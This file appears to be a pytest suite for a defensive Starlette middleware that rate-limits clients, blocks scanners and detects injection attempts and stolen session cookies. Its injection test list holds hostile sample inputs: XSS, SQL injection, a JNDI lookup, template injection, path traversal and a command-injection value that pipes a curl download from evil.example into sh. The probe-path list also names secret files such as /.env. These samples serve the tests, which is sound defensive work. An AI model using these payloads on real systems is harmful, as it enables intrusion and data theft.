from __future__ import annotations

import dataclasses

import pytest
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import JSONResponse, PlainTextResponse
from starlette.routing import Route
from starlette.testclient import TestClient

import security_shield
from security_shield import ClientIpResolver, SecurityShield, ShieldMiddleware, ShieldSettings


# conftest stubs out block persistence for every test; this module tests it.
_real_ensure_loaded = SecurityShield.ensure_loaded
_real_flush = SecurityShield.flush


class FakeClock:
    def __init__(self, start: float = 1_000_000.0) -> None:
        self.now = start

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


class MemoryStore:
    def __init__(self, payload=None) -> None:
        self.payload = payload
        self.saves: list[dict] = []

    def load(self):
        if self.payload is None:
            raise FileNotFoundError("security-blocks.json")
        return self.payload

    def save(self, payload) -> None:
        self.saves.append(payload)
        self.payload = payload


def _shield(clock=None, alerts=None, store=None, **overrides) -> SecurityShield:
    defaults = {
        "requests_per_minute": 10,
        "writes_per_minute": 4,
        "assets_per_minute": 20,
        "credential_failures": 5,
        "not_found": 6,
        "probes": 3,
        "surge_requests_per_minute": 10_000,
    }
    settings = dataclasses.replace(ShieldSettings(), **{**defaults, **overrides})
    return SecurityShield(
        settings,
        resolver=ClientIpResolver(),
        store=store,
        on_alert=alerts.append if alerts is not None else None,
        clock=clock or FakeClock(),
    )


# ---------------------------------------------------------------- client IPs


def test_spoofed_forwarded_for_entries_are_ignored():
    resolver = ClientIpResolver()
    # The client claims to be 1.1.1.1; the platform proxy appended the real address.
    assert resolver.resolve(["1.1.1.1", " 198.51.100.7"], peer="10.0.0.2") == "198.51.100.7"


def test_cloudflare_hop_vouches_for_cf_connecting_ip():
    resolver = ClientIpResolver()
    chain = ["6.6.6.6", "198.51.100.7", "172.70.1.1"]  # last hop is a Cloudflare edge
    assert resolver.resolve(chain, peer="10.0.0.2", cloudflare="198.51.100.7") == "198.51.100.7"
    # Platform proxy that replaces the header with the Cloudflare edge address.
    assert resolver.resolve(["172.70.1.1"], cloudflare="203.0.113.50") == "203.0.113.50"


def test_fake_cloudflare_header_from_direct_attacker_is_ignored():
    resolver = ClientIpResolver()
    chain = ["104.16.0.1", "203.0.113.66"]  # attacker forged a Cloudflare hop; proxy appended the truth
    assert resolver.resolve(chain, cloudflare="9.9.9.9") == "203.0.113.66"


def test_resolver_falls_back_sensibly():
    resolver = ClientIpResolver()
    assert resolver.resolve([], peer="testclient") == "testclient"
    assert resolver.resolve([], peer=None) == "unknown"
    assert resolver.resolve(["10.0.0.5", "10.0.0.6"]) == "10.0.0.5"
    assert resolver.resolve(["garbage", "[2001:db8::1]:443"]) == "2001:db8::1"
    assert resolver.resolve(["::ffff:198.51.100.9"]) == "198.51.100.9"


def test_resolver_honours_configured_header_and_extra_proxies():
    resolver = ClientIpResolver(header="X-Real-IP", trusted_networks=["198.51.100.0/24"])
    assert resolver.resolve(["1.1.1.1"], custom="203.0.113.9") == "203.0.113.9"
    assert resolver.resolve(["203.0.113.4", "198.51.100.7"]) == "203.0.113.4"


# ------------------------------------------------------------------- limits


def test_soft_limit_throttles_and_hard_limit_blocks():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts)
    verdicts = [shield.check("203.0.113.5", path="/dashboard").action for _ in range(10)]
    assert verdicts == ["allow"] * 10

    assert shield.check("203.0.113.5", path="/dashboard").action == "throttle"
    assert alerts == []  # throttling alone is logged, not alerted

    actions = [shield.check("203.0.113.5", path="/dashboard").action for _ in range(10)]
    assert actions[-1] == "block"
    assert alerts and alerts[-1]["kind"] == "blocked"
    assert "203.0.113.5" in alerts[-1]["summary"]
    # Other visitors are unaffected.
    assert shield.check("203.0.113.99", path="/dashboard").action == "allow"


def test_writes_have_their_own_tighter_budget():
    shield = _shield()
    actions = [shield.check("203.0.113.5", method="POST", path="/api/x").action for _ in range(5)]
    assert actions == ["allow"] * 4 + ["throttle"]


def test_static_assets_use_the_larger_budget():
    shield = _shield()
    actions = [shield.check("203.0.113.5", path="/static/app.js").action for _ in range(20)]
    assert set(actions) == {"allow"}
    assert shield.check("203.0.113.5", path="/dashboard").action == "allow"


def test_blocks_expire_and_escalate():
    clock = FakeClock()
    shield = _shield(clock=clock)
    durations = []
    for _ in range(4):
        for _ in range(3):
            shield.check("203.0.113.5", path="/.env")
        verdict = shield.check("203.0.113.5", path="/")
        assert verdict.action == "block"
        durations.append(verdict.retry_after)
        clock.advance(verdict.retry_after + 1)
        assert shield.check("203.0.113.5", path="/").action == "allow"
    assert durations == [900, 3600, 86400, 86400]


def test_probe_paths_are_refused_then_blocked():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts)
    assert shield.check("203.0.113.5", path="/wp-login.php").action == "probe"
    assert shield.check("203.0.113.5", path="/.git/config").action == "probe"
    assert shield.check("203.0.113.5", path="/.env").action == "block"
    assert "exploit paths" in alerts[-1]["summary"]


def test_scrambled_public_path_is_checked_for_probes():
    shield = _shield()
    for _ in range(2):
        assert shield.check("203.0.113.5", path="/.scrambled-not-found", raw_path="/.env").action == "probe"


def test_not_found_scanning_and_failed_logins_block():
    shield = _shield()
    for _ in range(6):
        shield.note_response("203.0.113.5", 404)
    assert shield.check("203.0.113.5", path="/").action == "block"

    for _ in range(4):
        shield.note_response("203.0.113.6", 401, had_credentials=True)
    # Anonymous 401s (a page polling before sign-in) never count.
    for _ in range(20):
        shield.note_response("203.0.113.6", 401, had_credentials=False)
    assert shield.check("203.0.113.6", path="/").action == "allow"
    shield.note_response("203.0.113.6", 403, had_credentials=True)
    assert shield.check("203.0.113.6", path="/").action == "block"


def test_auto_block_off_still_raises_the_alarm():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts, auto_block=False)
    actions = [shield.check("203.0.113.5", path="/.env").action for _ in range(3)]
    assert actions == ["probe", "probe", "throttle"]
    assert alerts[-1]["kind"] == "would-block"
    assert shield.active_blocks() == []


def test_internal_unknown_and_allowlisted_addresses_are_never_limited():
    shield = _shield(allowlist=("198.51.100.0/24",))
    for ip in ("10.1.2.3", "unknown", "198.51.100.20"):
        actions = {shield.check(ip, path="/.env").action for _ in range(50)}
        assert actions == {"allow"}, ip
    with pytest.raises(ValueError):
        shield.block_ip("10.1.2.3", seconds=3600, reason="no")


def test_alert_flood_is_held_back_and_summarised():
    alerts: list[dict] = []
    clock = FakeClock()
    shield = _shield(alerts=alerts, clock=clock)
    for index in range(25):
        ip = f"203.0.113.{index + 1}"
        for _ in range(3):
            shield.check(ip, path="/.env")
    assert len(alerts) == 10
    clock.advance(301)
    shield.check("198.51.100.1", path="/")  # periodic sweep reports what was held back
    assert "held back" in alerts[-1]["summary"]
    assert len(shield.active_blocks()) == 25


def test_site_wide_surge_and_spread_alerts():
    alerts: list[dict] = []
    clock = FakeClock()
    shield = _shield(alerts=alerts, clock=clock, surge_requests_per_minute=100, surge_throttled_ips=3)
    for index in range(100):
        shield.check(f"198.51.100.{index % 50 + 1}", path="/")
    assert any(alert["kind"] == "surge" for alert in alerts)

    for index in range(3):
        for _ in range(11):
            shield.check(f"203.0.113.{index + 1}", path="/")
    clock.advance(31)
    shield.check("198.51.100.200", path="/")
    assert any(alert["kind"] == "distributed" for alert in alerts)


def test_blocks_survive_a_restart():
    store = MemoryStore()
    clock = FakeClock()
    shield = _shield(clock=clock, store=store)
    _real_ensure_loaded(shield)
    shield.block_ip("203.0.113.5", seconds=3600, reason="Spam bot", actor="Director")
    _real_flush(shield)
    assert store.saves and store.saves[-1]["blocks"][0]["ip"] == "203.0.113.5"

    restarted = _shield(clock=clock, store=store)
    _real_ensure_loaded(restarted)
    verdict = restarted.check("203.0.113.5", path="/")
    assert verdict.action == "block"
    assert restarted.active_blocks()[0]["reason"] == "Spam bot"

    assert restarted.unblock_ip("203.0.113.5", actor="Director") is True
    assert restarted.check("203.0.113.5", path="/").action == "allow"
    assert restarted.unblock_ip("203.0.113.5") is False


def test_manual_block_validates_address():
    shield = _shield()
    with pytest.raises(ValueError):
        shield.block_ip("not-an-ip", seconds=60, reason="x")
    block = shield.block_ip(" 2001:db8::5 ", seconds=60, reason="")
    assert block.ip == "2001:db8::5"
    assert block.reason == "Blocked by a director"


def test_probe_detector_leaves_real_paths_alone():
    for path in ("/", "/dashboard", "/static/admin/console.js", "/media/wasp/track.mp3", "/api/admins/presence",
                 "/director/security-overview", "/branding/wallpapers/manifest", "/.well-known/acme-challenge/x"):
        assert not security_shield.is_probe_path(path), path
    for path in ("/.env", "/app/.env.production", "/wp-admin/", "/index.php", "/cgi-bin/luci", "/../etc/passwd",
                 "/.git/HEAD", "/actuator/env", "/backup.sql", "/x%00.html"):
        assert security_shield.is_probe_path(path), path


# ------------------------------------------------------------------- admins


def test_admins_are_limited_per_account_at_the_admin_factor():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts)  # 10 requests a minute, admins 5x
    actions = [shield.check("203.0.113.5", path="/director", account="42").action for _ in range(50)]
    assert actions == ["allow"] * 50
    assert shield.check("203.0.113.5", path="/director", account="42").action == "throttle"
    # Anonymous traffic from the same address has its own, normal budget.
    assert shield.check("203.0.113.5", path="/").action == "allow"

    actions = [shield.check("203.0.113.5", path="/director", account="42").action for _ in range(50)]
    assert actions[-1] == "block"
    assert alerts[-1]["kind"] == "blocked"
    assert "admin account 42 (from 203.0.113.5)" in alerts[-1]["summary"]
    # The owner is not special: a blocked account stays blocked from any address.
    assert shield.check("198.51.100.7", path="/director", account="42").action == "block"
    assert shield.check("198.51.100.7", path="/director", account="7").action == "allow"
    assert shield.unblock_ip("admin:42") is True
    assert shield.check("198.51.100.7", path="/director", account="42").action == "allow"


def test_admin_writes_404s_and_failed_logins_use_the_factor_too():
    shield = _shield()
    actions = [shield.check("203.0.113.5", method="POST", path="/api/x", account="42").action for _ in range(21)]
    assert actions == ["allow"] * 20 + ["throttle"]

    for _ in range(29):
        shield.note_response("203.0.113.6", 404, account="43")
    assert shield.check("203.0.113.6", path="/", account="43").action == "allow"
    shield.note_response("203.0.113.6", 404, account="43")
    assert shield.check("203.0.113.6", path="/", account="43").action == "block"

    for _ in range(25):
        shield.note_response("203.0.113.7", 401, had_credentials=True, account="44")
    assert shield.check("203.0.113.7", path="/", account="44").action == "block"


def test_an_ip_block_does_not_lock_out_an_admin_on_that_network():
    shield = _shield()
    for _ in range(3):
        shield.check("203.0.113.5", path="/.env")
    assert shield.check("203.0.113.5", path="/").action == "block"
    assert shield.check("203.0.113.5", path="/director", account="42").action == "allow"


# ------------------------------------------------------ rotating addresses


def test_ipv6_addresses_in_one_64_share_a_budget():
    shield = _shield()
    for index in range(10):
        assert shield.check(f"2001:db8:1:2::{index + 1:x}", path="/").action == "allow"
    assert shield.check("2001:db8:1:2:ffff::1", path="/").action == "throttle"
    assert shield.check("2001:db8:1:3::1", path="/").action == "allow"

    for index in range(3):
        shield.check(f"2001:db8:9:9::{index + 1}", path="/.env")
    assert shield.active_blocks()[0]["ip"] == "2001:db8:9:9::/64"
    assert shield.check("2001:db8:9:9::abcd", path="/").action == "block"


def test_neighbouring_addresses_share_a_network_budget():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts, network_factor=2.0)  # 20 requests a minute per /24
    actions = [shield.check(f"203.0.113.{index + 1}", path="/").action for index in range(20)]
    assert actions == ["allow"] * 20
    assert shield.check("203.0.113.100", path="/").action == "throttle"
    assert shield.check("198.51.100.1", path="/").action == "allow"

    actions = [shield.check(f"203.0.113.{index + 101}", path="/").action for index in range(20)]
    assert actions[-1] == "block"
    assert "network 203.0.113.0/24" in alerts[-1]["summary"]
    assert shield.check("203.0.113.250", path="/").action == "block"
    assert shield.active_blocks()[0]["kind"] == "network"


def test_surge_switches_on_under_attack_mode_which_tightens_anonymous_limits():
    alerts: list[dict] = []
    clock = FakeClock()
    hosting = {"192.0.2.10"}
    shield = SecurityShield(
        dataclasses.replace(
            ShieldSettings(), requests_per_minute=10, surge_requests_per_minute=100, network_factor=100.0
        ),
        resolver=ClientIpResolver(),
        on_alert=alerts.append,
        clock=clock,
        network_classifier=lambda ip: "datacenter" if ip in hosting else None,
    )
    for index in range(100):
        shield.check(f"198.51.{index}.1", path="/")
    assert shield.under_attack()
    assert "Under-attack mode is on" in next(a for a in alerts if a["kind"] == "surge")["summary"]

    clock.advance(120)  # past the surge minute
    assert [shield.check("203.0.113.5", path="/").action for _ in range(6)] == ["allow"] * 5 + ["throttle"]
    assert [shield.check("192.0.2.10", path="/").action for _ in range(3)] == ["allow"] * 2 + ["throttle"]
    actions = [shield.check("203.0.113.9", path="/", account="42").action for _ in range(50)]
    assert set(actions) == {"allow"}

    clock.advance(shield.settings.under_attack_seconds)
    assert not shield.under_attack()
    assert [shield.check("203.0.113.77", path="/").action for _ in range(10)] == ["allow"] * 10


def test_directors_can_switch_under_attack_mode_and_it_survives_a_restart():
    store = MemoryStore()
    clock = FakeClock()
    shield = _shield(clock=clock, store=store)
    _real_ensure_loaded(shield)
    shield.set_under_attack(3600, actor="Director")
    _real_flush(shield)
    assert store.saves[-1]["under_attack_until"] == clock.now + 3600

    restarted = _shield(clock=clock, store=store)
    _real_ensure_loaded(restarted)
    assert restarted.stats()["under_attack"] is True
    assert restarted.stats()["under_attack_reason"] == "raised by Director"
    assert restarted.clear_under_attack(actor="Director") is True
    assert restarted.under_attack() is False
    assert restarted.clear_under_attack() is False


# --------------------------------------------------------------- injection


_INJECTIONS = (
    ("/search", "q=<script>alert(1)</script>"),
    ("/search", "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
    ("/search", "q=%253Csvg%2520onload%253Dalert(1)%253E"),  # encoded twice
    ("/search", 'q="><img src=x onerror=alert(1)>'),
    ("/go", "next=javascript:alert(document.cookie)"),
    ("/archive", "id=1 UNION ALL SELECT username,password FROM users"),
    ("/archive", "id=1' OR '1'='1"),
    ("/archive", "id=1;SELECT pg_sleep(5)"),
    ("/archive", "q=x' and 1=1--"),
    ("/api", "x=${jndi:ldap://evil.example/a}"),
    ("/page", "name={{7*7}}"),
    ("/page", "name={{config.items()}}"),
    ("/ping", "host=127.0.0.1;curl http://evil.example/x|sh"),
    ("/file", "path=../../etc/passwd"),
    ("/file", "path=php://filter/resource=index"),
    ("/<script>alert(1)</script>", ""),
)

_LEGITIMATE = (
    ("/", ""),
    ("/dashboard", "guild=1234567890"),
    ("/login", "next=/director/files?key=archive/omega/report.json"),
    ("/auth/callback", "code=Xy9_aB-12&state=k3J9mQ"),
    ("/archive/search", "q=operation union station"),
    ("/archive/search", "q=Fish and chips = good"),
    ("/archive/search", "q=O'Brien and Smith"),
    ("/api/support/stream", "token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.c2ln"),
    ("/zeta", "onboarding=1&select=all"),
    ("/wasp", "track=Night+Ops+%E2%80%94+Remix&t=1:30"),
    ("/director/files/content", "key=dossiers/a b/c.json"),
    ("/fleet", "sort=-updated&filter=class:frigate"),
)


def test_injection_detector():
    for path, query in _INJECTIONS:
        assert security_shield.looks_like_injection(path, query), (path, query)
    for path, query in _LEGITIMATE:
        assert not security_shield.looks_like_injection(path, query), (path, query)


def test_injection_attempts_are_refused_then_blocked():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts)
    assert shield.check("203.0.113.5", path="/search", query="q=<script>x</script>").action == "probe"
    assert shield.check("203.0.113.5", path="/archive", query="id=1 union select 1").action == "probe"
    assert shield.check("203.0.113.5", path="/page", query="n={{7*7}}").action == "block"
    assert "injection payloads" in alerts[-1]["summary"]
    assert "{{7*7}}" in alerts[-1]["summary"]


# ------------------------------------------------------------- concurrency


def test_requests_in_progress_are_capped_per_client_and_site_wide():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts, max_pending_per_client=2, max_pending=4)
    assert shield.acquire("203.0.113.5").action == "allow"
    assert shield.acquire("203.0.113.5").action == "allow"
    assert shield.acquire("203.0.113.5").action == "throttle"
    shield.release("203.0.113.5")
    assert shield.acquire("203.0.113.5").action == "allow"

    assert shield.acquire("198.51.100.1").action == "allow"
    assert shield.acquire("198.51.100.2").action == "allow"
    assert shield.stats()["in_progress"] == 4
    assert shield.acquire("198.51.100.3").action == "overload"
    assert alerts[-1]["kind"] == "overload"
    assert shield.under_attack()
    # Admins can still get in to deal with it, up to their own (larger) cap.
    assert [shield.acquire("198.51.100.9", account="42").action for _ in range(10)] == ["allow"] * 10
    assert shield.acquire("198.51.100.9", account="42").action == "throttle"

    for ip in ("203.0.113.5", "203.0.113.5", "198.51.100.1", "198.51.100.2"):
        shield.release(ip)
    for _ in range(10):
        shield.release("198.51.100.9", account="42")
    shield.release("203.0.113.5")  # releasing more than was taken is harmless
    assert shield.stats()["in_progress"] == 0
    assert shield.acquire("198.51.100.3").action == "allow"


# ---------------------------------------------------------- manual blocks


def test_directors_can_block_whole_networks():
    shield = _shield()
    block = shield.block_ip("203.0.113.77/24", seconds=3600, reason="Botnet", actor="Director")
    assert block.ip == "203.0.113.0/24"
    assert block.kind == "network"
    assert shield.check("203.0.113.200", path="/").action == "block"
    assert shield.check("203.0.114.1", path="/").action == "allow"
    assert shield.block_ip("198.51.100.5/32", seconds=60, reason="").ip == "198.51.100.5"
    for too_wide in ("203.0.0.0/8", "2001:db8::/16"):
        with pytest.raises(ValueError, match="too wide"):
            shield.block_ip(too_wide, seconds=60, reason="")
    with pytest.raises(ValueError, match="cannot be blocked"):
        shield.block_ip("10.0.0.0/16", seconds=60, reason="")
    assert shield.unblock_ip("203.0.113.0/24") is True
    assert shield.check("203.0.113.200", path="/").action == "allow"
    # Sizes other than the per-network budget's are matched by containment.
    shield.block_ip("198.18.0.0/16", seconds=60, reason="")
    shield.block_ip("2001:db8:aa::/48", seconds=60, reason="")
    assert shield.check("198.18.77.1", path="/").action == "block"
    assert shield.check("2001:db8:aa:1::5", path="/").action == "block"
    assert shield.check("2001:db8:ab::5", path="/").action == "allow"


def test_network_and_account_blocks_survive_a_restart():
    store = MemoryStore()
    clock = FakeClock()
    shield = _shield(clock=clock, store=store)
    _real_ensure_loaded(shield)
    shield.block_ip("203.0.113.0/24", seconds=3600, reason="Botnet")
    for _ in range(15):
        shield.check("198.51.100.1", path="/.env", account="42")
    _real_flush(shield)

    restarted = _shield(clock=clock, store=store)
    _real_ensure_loaded(restarted)
    assert restarted.check("203.0.113.9", path="/").action == "block"
    assert restarted.check("198.51.100.1", path="/", account="42").action == "block"
    assert {row["kind"] for row in restarted.active_blocks()} == {"network", "account"}


# --------------------------------------------------------------- middleware


def _app(shield: SecurityShield, *, admin=None, origins=()):
    async def page(request: Request):
        return PlainTextResponse("ok")

    async def upload(request: Request):
        body = await request.body()
        return JSONResponse({"size": len(body)})

    async def denied(request: Request):
        return PlainTextResponse("no", status_code=401)

    app = Starlette(
        routes=[
            Route("/", page),
            Route("/health", page),
            Route("/upload", upload, methods=["POST"]),
            Route("/denied", denied),
        ]
    )
    app.add_middleware(
        ShieldMiddleware, shield=shield, admin_identity=admin, trusted_origins=list(origins)
    )
    return app


def test_middleware_throttles_with_retry_after_and_blocks():
    shield = _shield()
    client = TestClient(_app(shield))
    for _ in range(10):
        assert client.get("/").status_code == 200
    throttled = client.get("/", headers={"accept": "application/json"})
    assert throttled.status_code == 429
    assert throttled.headers["retry-after"] == "60"
    assert throttled.json()["error"] == "Too many requests"
    for _ in range(10):
        response = client.get("/", headers={"accept": "text/html"})
    assert response.status_code == 403
    assert "temporarily blocked" in response.text
    assert int(response.headers["retry-after"]) > 0
    # Health checks from the platform are never limited.
    assert client.get("/health").status_code == 200


def test_middleware_counts_404s_and_refuses_probes():
    shield = _shield()
    client = TestClient(_app(shield))
    assert client.get("/wp-login.php").status_code == 404
    for _ in range(6):
        client.get("/nothing-here")
    assert client.get("/").status_code == 403


def test_middleware_counts_failed_credentials():
    shield = _shield()
    client = TestClient(_app(shield))
    for _ in range(5):
        assert client.get("/denied", headers={"authorization": "Basic Zm9vOmJhcg=="}).status_code == 401
    assert client.get("/").status_code == 403


def test_admins_get_more_room_but_are_not_exempt():
    shield = _shield()
    client = TestClient(_app(shield, admin=lambda scope: "42"))
    # Five times the probes an anonymous client gets, then the account is blocked.
    assert {client.get("/.env").status_code for _ in range(14)} == {404}
    assert client.get("/.env").status_code == 403
    blocked = client.get("/", headers={"accept": "text/html"})
    assert blocked.status_code == 403
    assert "from your account" in blocked.text
    assert shield.active_blocks()[0]["ip"] == "admin:42"
    # The account was blocked, not the IP it came from.
    assert TestClient(_app(shield)).get("/").status_code == 200


def test_query_string_tokens_count_as_credentials():
    shield = _shield()
    client = TestClient(_app(shield))
    for _ in range(5):
        assert client.get("/denied?token=guess").status_code == 401
    assert client.get("/").status_code == 403


def test_body_size_limits():
    shield = _shield(max_body_bytes=100, max_upload_bytes=1000)
    client = TestClient(_app(shield))
    assert client.post("/upload", content=b"x" * 100).json() == {"size": 100}
    assert client.post("/upload", content=b"x" * 101).status_code == 413

    def chunks():
        for _ in range(5):
            yield b"x" * 50

    # No Content-Length: the stream is cut off once it passes the limit.
    assert client.post("/upload", content=chunks()).status_code == 413
    files = {"file": ("a.bin", b"x" * 500)}
    assert client.post("/upload", files=files).status_code == 200


def test_cross_site_writes_are_refused():
    shield = _shield()
    client = TestClient(_app(shield, origins=["https://panel.example.com"]))
    cross = {"sec-fetch-site": "cross-site", "origin": "https://evil.example"}
    assert client.post("/upload", content=b"x", headers=cross).status_code == 403
    assert client.post("/upload", content=b"x", headers={"sec-fetch-site": "same-origin"}).status_code == 200
    trusted = {"sec-fetch-site": "cross-site", "origin": "https://panel.example.com"}
    assert client.post("/upload", content=b"x", headers=trusted).status_code == 200
    # Cross-site navigation (GET) is how links work and stays allowed.
    assert client.get("/", headers={"sec-fetch-site": "cross-site"}).status_code == 200


def test_disabled_shield_passes_everything_through():
    shield = _shield(enabled=False)
    client = TestClient(_app(shield))
    assert {client.get("/").status_code for _ in range(50)} == {200}


def _session_app(shield: SecurityShield, *, admin=None):
    """An app with real signed sessions in front of the shield, as in config_app."""

    from starlette.middleware.sessions import SessionMiddleware

    async def sign_in(request: Request):
        request.session["user"] = {"id": "42", "username": "ada"}
        return PlainTextResponse("signed in")

    async def me(request: Request):
        user = request.session.get("user")
        return JSONResponse({"user": user["id"] if user else None})

    app = Starlette(routes=[Route("/sign-in", sign_in), Route("/me", me)])
    app.add_middleware(ShieldMiddleware, shield=shield, admin_identity=admin)
    app.add_middleware(SessionMiddleware, secret_key="test-secret")
    return app


_CHROME_130 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
_CHROME_131 = _CHROME_130.replace("Chrome/130.0.0.0", "Chrome/131.0.6778.86")
_SCRIPT = "python-requests/2.32.3"


def test_session_cookie_only_works_in_the_browser_it_was_first_used_in():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts)
    is_admin = lambda scope: (scope.get("session") or {}).get("user", {}).get("id")  # noqa: E731
    owner = TestClient(_session_app(shield, admin=is_admin), headers={"user-agent": _CHROME_130})
    owner.get("/sign-in")
    assert owner.get("/me").json() == {"user": "42"}
    # A browser update changes the version numbers, not the browser.
    owner.headers["user-agent"] = _CHROME_131
    assert owner.get("/me").json() == {"user": "42"}

    thief = TestClient(_session_app(shield, admin=is_admin), headers={"user-agent": _SCRIPT})
    thief.cookies.update(owner.cookies)
    assert thief.get("/me").json() == {"user": None}
    assert alerts[-1]["kind"] == "session-mismatch"
    assert alerts[-1]["severity"] == "critical"
    assert "admin ada (42)" in alerts[-1]["summary"]
    # The copied cookie is dropped, so it does not work on the next try either.
    assert thief.get("/me").json() == {"user": None}


def test_member_session_mismatch_is_logged_without_paging_anyone():
    alerts: list[dict] = []
    shield = _shield(alerts=alerts)
    member = TestClient(_session_app(shield), headers={"user-agent": _CHROME_130})
    member.get("/sign-in")
    thief = TestClient(_session_app(shield), headers={"user-agent": _SCRIPT})
    thief.cookies.update(member.cookies)
    assert thief.get("/me").json() == {"user": None}
    assert alerts == []
    assert shield.recent_events()[0]["kind"] == "session-mismatch"


def test_websocket_handshakes_refused_with_a_token_count_as_failed_logins():
    from starlette.routing import WebSocketRoute
    from starlette.websockets import WebSocket

    async def socket(websocket: WebSocket):
        if websocket.query_params.get("token") != "right":
            await websocket.close(code=1008)
            return
        await websocket.accept()
        await websocket.send_text("hello")
        await websocket.close()

    shield = _shield()
    app = Starlette(routes=[Route("/", lambda request: PlainTextResponse("ok")), WebSocketRoute("/ws", socket)])
    app.add_middleware(ShieldMiddleware, shield=shield)
    client = TestClient(app)
    with client.websocket_connect("/ws?token=right") as ws:
        assert ws.receive_text() == "hello"
    from starlette.websockets import WebSocketDisconnect

    for _ in range(5):
        with pytest.raises(WebSocketDisconnect):
            with client.websocket_connect("/ws?token=guess"):
                pass
    assert client.get("/").status_code == 403


def test_streaming_responses_free_their_slot_once_they_start():
    from starlette.responses import StreamingResponse

    shield = _shield()
    seen: list[int] = []

    async def stream(request: Request):
        async def body():
            seen.append(shield.stats()["in_progress"])
            yield b"data: 1\n\n"

        return StreamingResponse(body(), media_type="text/event-stream")

    async def page(request: Request):
        seen.append(shield.stats()["in_progress"])
        return PlainTextResponse("ok")

    app = Starlette(routes=[Route("/stream", stream), Route("/", page)])
    app.add_middleware(ShieldMiddleware, shield=shield)
    client = TestClient(app)
    assert client.get("/").status_code == 200
    assert client.get("/stream").text == "data: 1\n\n"
    assert seen == [1, 0]
    assert shield.stats()["in_progress"] == 0


def test_overloaded_server_sheds_anonymous_requests_but_serves_admins():
    shield = _shield(max_pending=50)
    for index in range(50):
        shield.acquire(f"198.51.100.{index + 1}")
    response = TestClient(_app(shield)).get("/", headers={"accept": "application/json"})
    assert response.status_code == 503
    assert response.headers["retry-after"] == "5"
    assert TestClient(_app(shield, admin=lambda scope: "42")).get("/").status_code == 200


def test_csp_nonce_is_fresh_per_response_and_empty_outside_one():
    import contextvars

    assert contextvars.Context().run(security_shield.csp_nonce) == ""
    first = contextvars.Context().run(security_shield.new_csp_nonce)
    second = contextvars.Context().run(security_shield.new_csp_nonce)
    assert first != second and len(first) >= 24


def test_injection_check_stays_fast_on_hostile_urls():
    import time

    hostile = ["< " * 8000, "<x " * 5000, "' or " * 3000, "{{ " * 5000, "${" * 8000]
    started = time.perf_counter()
    for text in hostile:
        security_shield.looks_like_injection(text, text)
    # A backtracking pattern takes seconds here; the bounded ones take milliseconds.
    assert time.perf_counter() - started < 0.5
